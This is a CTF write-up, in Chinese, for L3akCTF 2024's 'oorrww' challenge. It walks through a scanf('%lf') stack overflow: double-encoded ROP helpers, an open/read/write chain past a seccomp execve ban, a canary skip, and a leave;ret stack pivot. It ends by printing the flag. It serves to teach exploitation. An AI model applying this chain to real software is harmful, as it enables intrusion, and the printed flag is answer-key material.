# L3akCTF 2024 oorrww Writeup

## 题目简述

程序在栈上定义 `char idx[0x98]`，先把栈地址和 `scanf` 地址的 64 位位模式解释成 `double` 输出，然后连续执行 22 次：

```c
scanf("%lf", &idx[i * 8]);
```

总写入长度为 $22\times8=0xb0$ 字节，超过 0x98 字节缓冲区，可覆盖 canary、保存的 RBP 和返回地址。输入只能经过 `%lf`，所以每个 ROP qword 都要编码成可被 `scanf` 还原出相同 IEEE-754 位模式的十进制浮点数。

程序启用 PIE、NX、Full RELRO 和 stack canary，并用 seccomp 禁止 `execve`、`execveat`。题目已经主动泄露栈与 libc，因此最终采用栈迁移和 `open/read/write` ROP。

## 解题过程

### 1. 把浮点输出还原为指针

`gifts` 没有做数值转换，而是按位重解释：

```c
double stack_leak = *((double *)&idx);
double scanf_leak = *((double *)&funcPtr);
```

接收十进制文本后，应先解析为 `double`，再取其原始 8 字节：

```python
def double_to_u64(text):
    return u64(struct.pack("<d", float(text)))

stack = double_to_u64(stack_text)
libc.address = double_to_u64(scanf_text) - libc.sym["__isoc99_scanf"]
```

反向写 ROP qword 时做相反操作：

```python
def u64_to_double(value):
    return repr(struct.unpack("<d", p64(value))[0]).encode()
```

这里需要保留足以 round-trip 的有效数字；不能把地址当普通浮点数做近似格式化。

### 2. 在 0x98 字节缓冲区中布置 ORW

seccomp 只杀死进程执行相关系统调用，文件读写仍允许。官方链调用题目 libc 中的 `open`、`read`、`write`：

```text
open("flag.txt", 0)
read(3, stack + 0x200, 0x50)
write(2, stack + 0x200, 0x50)
```

前 18 个 double 槽放 ROP 链，第 19 个槽即偏移 `0x90` 放字符串：

```python
p64(0x7478742e67616c66)  # b"flag.txt"
```

链的关键结构为：

```text
pop rdi ; ret
stack + 0x90
pop rsi ; ret
0
open

pop rdi ; ret
3
pop rsi ; ret
stack + 0x200
pop rdx ; pop rbx ; ret
0x50
0x50
read

pop rdi ; ret
2
pop rsi ; ret
stack + 0x200
write
```

### 3. 保留 canary 并迁移栈

索引 19 的目标恰好是 canary。给 `%lf` 输入单独的 `-` 会造成匹配失败，`scanf` 返回 0 且不修改目标内存，因此原 canary 保持不变：

```python
sendline(b"-")
```

后两个槽分别覆盖保存的 RBP 和返回地址：

```python
saved_rbp = stack - 8
saved_rip = libc.address + leave_ret_offset
```

函数返回到 `leave; ret` 后，`rsp` 被迁移到 `idx` 开头，开始执行已经写好的 ORW 链。读取 `flag.txt` 得到：

```text
L3AK{th3_d0ubl3d_1nput_r3turns_whAt_u_wAnt}
```

## 方法总结

- `%lf` 并不阻止任意 8 字节写入，只是要求攻击者把目标位模式编码成可回读的十进制 double。
- `scanf` 转换失败不会写目标地址。本题用一个不完整的 `-` 精确跳过 canary 槽，是利用链中最关键的细节。
- seccomp 禁止 `execve` 后应先枚举仍开放的文件系统调用；flag 是普通文件时，ORW 通常比尝试绕过执行限制更直接。
